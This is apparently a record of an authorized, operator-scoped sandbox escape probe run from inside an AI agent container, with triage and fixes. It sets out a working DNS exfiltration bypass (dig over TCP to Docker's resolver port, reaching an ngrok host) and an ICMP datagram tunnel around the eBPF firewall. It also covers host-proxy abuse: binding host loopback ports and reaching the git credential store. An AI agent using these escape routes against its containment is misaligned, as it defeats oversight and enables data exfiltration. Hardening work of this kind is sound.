> Retained record (2026-10-26, branch `release/mythos-hardening`, HEAD 8a7e1b23, container `clawker.clawker.dev`, Docker Desktop macOS, kernel 7.0.14-linuxkit). Operator-directed sandbox probe from inside an agent container. Findings reflect that date; check source before reuse.

# Sandbox escape probe (2026-10-26)

Scope set by operator: clawker secure defaults only. Out of scope by operator ruling: bind-mounted repo incl. `.git`, host `~/.claude` dir binds (plugins/session history), host proxy existence and its lack of authentication (policy-gated, user kept it open), key scopes the user granted. Goal: anything undocumented that reaches out of the sandbox. Stop at first proof.

## RESULT: proven egress bypass (DNS) — STOPPED HERE

**Docker embedded DNS reachable on its real TCP port bypasses CoreDNS NXDOMAIN.**

- Docker's embedded resolver listens inside the container netns at `127.0.0.11:<random>` (this run: TCP 36837; visible in `/proc/net/tcp` as `0B00007F:8FE5`, world-readable). Docker DNATs `127.0.0.11:53` → that port; clawker's eBPF redirect matches **dst port 53 only** (`controlplane/firewall/ebpf/bpf/common.h` ~L880 and ~L987: `if (dst_port == DNS_PORT) → CoreDNS`), then the **loopback pass-through** (`if (is_loopback(dst_ip)) return allow`, ~L888 / ~L994) lets any other `127.0.0.11:<port>` connect through.
- Proof: `dig +tcp @127.0.0.11 -p 36837 ajschmitt.ngrok.app` → NOERROR, 6 AWS A records. Same for `example.com` (→ Cloudflare IPs) and a never-seen unique label `probe<epoch>.ajschmitt.ngrok.app` → NOERROR. CoreDNS path (port 53) returned NXDOMAIN for all of these. Docker DNS forwards to its ExtServers (`1.1.1.2`, `1.0.0.2`, see `/etc/resolv.conf` comment) from the Docker VM, outside the agent's eBPF.
- Impact: (1) **DNS exfiltration channel** — arbitrary query names leave the sandbox to public recursive resolvers and the attacker's authoritative NS, exactly the channel `docs/threat-model.mdx` says is closed ("There is no upstream resolver fallback"). (2) **Sibling/infra discovery** — PTR and name queries answer for every container on `clawker-net`: `172.18.0.3 → clawker.clawker.alt.clawker-net.`, `.200 clawker-envoy`, `.201 clawker-coredns`, `.202 clawker-controlplane`. Direct TCP to the sibling still fails (`EPERM`, eBPF subnet deny), so discovery only, not access.
- UDP: the UDP port Docker DNS uses was not found in `/proc/net/udp`; `dig` UDP to 36837 → connection refused. TCP alone is enough.
- Not turned into TCP egress: resolved IPs are not in the eBPF `dns_cache`, so connects are redirected to Envoy and denied (403 / TLS reset). Bypass is DNS-only.
- Fix direction (not implemented, operator decides): in eBPF deny loopback dst `127.0.0.11` on any port other than the 53 redirect (connect4/sendmsg4 and the v4-mapped v6 twins), or stop the container from pointing at `127.0.0.11` at all (set container `dns` to CoreDNS IP and drop the loopback carve-out for `127.0.0.11`). Add a firewall-uat probe: `dig +tcp @127.0.0.11 -p $(port from /proc/net/tcp) example.com` must fail.

**Re-verified 2026-10-26 from the host** (`clawker exec -u clawker --agent alt`, top 8a7e1b23): CoreDNS :53 → NXDOMAIN; `dig +tcp @127.0.0.11 -p 44547 example.com` → NOERROR with A records; unique `probe<epoch>.ajschmitt.ngrok.app` → NOERROR. Source confirms: `decide_connect`/`decide_sendmsg` redirect only `dst_port == 53`, then `is_loopback` passes. No default `--dns` on agent containers. Secondaries 1, 2, 4 and 5 confirmed in source (`server.go` handleCallbackRegister port 1-65535 only; `git_credential.go` get/store/erase, no egress check; `Dockerfile.base.tmpl:129` docker group unconditional; `applySecurityOptions` sets SecurityOpt only from CLI). Item 3 is deliberate normalization (`domainMatchType` lowercases + trims dot), same host, not a defect.

## Secondary findings (not escapes; report for triage)

1. **Host proxy `POST /callback/register` binds any host loopback port, no gate.** Registered port `1455` (Codex OAuth loopback port) and `48123` from the container: both `success:true`, listener bound on host `127.0.0.1`/`[::1]`, TTL up to 30 min, captured requests readable via `GET /callback/{session}/data`. Deleted both. Lets the agent squat/capture host-local HTTP traffic for other apps' loopback flows (OAuth callbacks of non-clawker tools, dev servers) and DoS host ports. Operator ruled proxy existence fine; this is reach beyond the intended "agent's own OAuth callback" purpose. `internal/hostproxy/server.go` `handleCallbackRegister` / `startDynamicListener`.
2. **Host proxy `POST /git/credential` has no egress/host scoping and exposes `store`/`erase`.** Any `host` value is passed to the host's `git credential fill|approve|reject` (verified with a bogus host → helper error, no secret pulled; real extraction deliberately not attempted). `open/url` is egress-gated; this endpoint is not, and `approve`/`reject` mutate the host credential store from the container. `internal/hostproxy/git_credential.go`.
3. **Host proxy `open/url` accepts a trailing-dot/uppercase host** (`https://API.GITHUB.COM./` → `success:true`, opened a host browser tab during the probe). Same-host, allow-direction only; not a bypass, but normalization drift vs Envoy. All other variants (userinfo, `%2e`, `#@`, punycode, denied hosts, `file:`) were blocked.
4. Agent user is in group `docker` (gid 999) while `security.docker_socket: false`. Latent; harmless without a socket.
5. `NoNewPrivs=0` with setuid binaries (`su`, `mount`, `passwd`, `chsh`) in the image. In-container only; no host reach. Candidate hardening: `no-new-privileges` security opt.

## What held (verified negative)

- Firewall L7: Host-header/`:authority` fronting on allowed SNI (h1, h2) → 403; `--resolve` to Envoy with denied SNI → reset; absolute-URI and CONNECT request lines → no response; plain HTTP to Envoy → 403; direct-IP https → reset, http → 403; native IPv6 → fail; non-DNS UDP → refused.
- Every off-subnet TCP connect lands on Envoy `172.18.0.200:10000` (getpeername shows the rewrite) except the host proxy port `192.168.65.254:18374`, which passes through.
- In-subnet: `EPERM` for all except Envoy `:10000`, CoreDNS `:53`, CP `:7444` (mTLS, no cert → fail) and `:4444` (Hydra public: discovery/jwks/health 200; `/oauth2/register` 404; token without assertion 400). Hydra admin `4445`, CP `7080` → `EPERM`.
- Host ports other than 18374 → Envoy 403. Infra names do not resolve via CoreDNS. Sibling unreachable (`EPERM`).
- Container: caps all 0, bounding = docker default, seccomp filter present, `/sys` ro, no docker socket, `/run/clawker/bootstrap` root-only (agent cert not readable), clawkerd `[::]:7700` is mTLS with CP CA pin, OTLP relay loopback only.
- Egress rules file and CA key are not in the workspace (`.clawkerlocal` holds only settings/registry YAML).
- semgrep `p/golang` + `p/security-audit` on hostproxy, clawkerd, container create, socketbridge, controlplane/agent: 0 results.

## Addendum (07:53–07:57 UTC, after operator asked about sibling and CP)

- **DNS bypass fixed live during the session**: commit `6d592fb0` (07:55:47 UTC) "fix(ebpf): deny Docker's embedded resolver on its direct port" adds a `dst_ip == DOCKER_EMBEDDED_DNS → V_DENY` branch before the loopback pass-through in `decide_connect`. Re-test after CP redeploy: `127.0.0.11:36837 → EPERM`. The bypass above was observed on the pre-fix programs (same batch showed off-subnet TCP still redirected to Envoy, so enforcement was on when it succeeded).
- **Transient fail-open window during CP redeploy/re-enroll (~07:53 UTC)**: for at least one multi-second batch, `connect4` was not enforcing on this container (`1.1.1.1:443` connected direct, `https://example.com/` → 200, sibling `172.18.0.3:7700` reachable, `.3:80` → ECONNREFUSED instead of EPERM, `ping` replies from host/internet) while `sendmsg4` still enforced (UDP to `.202:7080` → EPERM). By 07:55:56 all hooks enforced again. Mechanism candidate: `Manager.Enable` runs `cleanupLinks` (closes links, removes pins) before the sequential `link.AttachCgroup` loop (`controlplane/firewall/ebpf/manager.go` ~L595–640), and CP shutdown/startup ordering may leave a gap; correlate with CP logs. Impact: any agent running during a CP upgrade/re-enroll has seconds of unrestricted TCP egress and sibling reach.
- **ICMP datagram-socket egress bypass, confirmed under enforcement (07:56 UTC, same batch had `.3:80 → EPERM`)**: `socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP)` + `sendto()` echo request to `1.1.1.1` and `54.219.100.51` → echo replies received with payload. `ping` itself fails because it calls `connect()` (connect4 denies unrouted DGRAM); an unconnected `sendto` has no hook: `sendmsg4` is the UDP hook (`udp_sendmsg` only), and `sock_create` denies only `SOCK_RAW` (`clawker.c` Program 5). `ping_group_range` is `0 2147483647`, so any uid can open ping sockets. This is the ICMP tunnel channel the threat model says is closed. Fix: in `sock_create` deny `type == SOCK_DGRAM && (protocol == IPPROTO_ICMP || protocol == IPPROTO_ICMPV6)`, or set `net.ipv4.ping_group_range = 1 0` on the container.
- **Sibling**: unreachable in the enforced state on every lane tried (TCP ports, v6-mapped, UDP, CoreDNS name, host proxy `open/url` on its IP). Only reachable during the window above. Its name/IP leaked via the (now fixed) Docker DNS port. `:7700` serves a `CN=clawker-clawkerd` cert.
- **CP**: `7444` sends a TLS CertificateRequest (CA-pinned client auth), no cert → handshake fails. Hydra public `4444`: `/oauth2/auth` 302, `/userinfo` 401, `/oauth2/token` → `invalid_client` for guessed secrets, `/oauth2/register` 404, admin paths 404, `/oauth2/fallbacks/error` 500. UDP `sendto` to CP `7444`/`4444` is permitted by the intra-subnet allowlist (port-only match, no transport check); `7080` denied. Harmless today (nothing listens on UDP), but the allowlist should be TCP-only.
- OTLP relay rejects JSON (415); protobuf not tried.

## Status after host triage (2026-10-26)

- Docker DNS direct port: FIXED #598 `6d592fb0`, e2e `TestFirewall_DockerDNSDirectPortDenied`.
- ICMP datagram tunnel: re-proven live from the host (`alt`, echo payload returned from 1.1.1.1); FIXED #598 `2ad487c8` (`sock_create` denies SOCK_DGRAM + ICMP/ICMPv6), e2e `TestFirewall_ICMPBlocked`.
- Fail-open window ~07:53: cause = operator's e2e run on the same host. The test CP shares host BPF pins; harness cleanup `firewall down` (FlushAll) opened live agents until host `controlplane up` re-enrolled at 07:55:02. `firewall down` opening agents is BY DESIGN (operator ruling: egress off, fs isolation kept). Harness now refuses to run with live non-test agents (#598 `516c2bbb`).
- UDP to CP 7444/4444: operator ruling, no change (no UDP listener, no risk).
- No-new-privileges: FIXED #589 `d9337afe` (default `no-new-privileges` in `applySecurityOptions`; user `--security-opt no-new-privileges=<bool>` replaces it), e2e `TestSandbox_NoNewPrivileges_E2E`.
- Docker group: operator ruling, NO CHANGE. clawkerd resolves supplementary groups once at startup (`internal/clawkerd/cmd.go` `ResolveUser`), before CP boot steps, so membership cannot be added only when the socket is mounted. Tried boot-step `usermod`: socket got `docker` group, CMD did not. e2e `TestSandbox_DockerSocketGroup_E2E` pins the opt-in path.
- Host proxy items 1-2: operator ruling 2026-10-26 = put the host proxy behind the CP (clawkerd loopback relay → CP authZ per container → host proxy), new stack layer. IMPLEMENTED in #604 `feat/hostproxy-behind-cp` (HostProxyService.Connect reverse stream on CP admin listener 7443, own Hydra client + CLI-CA leaf, no host TCP listener except OAuth callback ports); Linux UAT on bigdaddy PASSED 2026-10-27.

## Method log

Recon (`id`, env, caps, mounts, `/proc/net/*`), static read of `internal/hostproxy` handlers and `egress_check.go`, errno-classified connect sweep of `172.18.0.0/24`, lane-by-lane probes against operator-provided target `ajschmitt.ngrok.app`, then Docker-DNS direct-port test after spotting `127.0.0.11:36837` in `/proc/net/tcp`.

Earlier zsh `/dev/tcp` probes were invalid (zsh has no `/dev/tcp`); all conclusions above come from `bash -c`, curl, dig, or python socket runs.
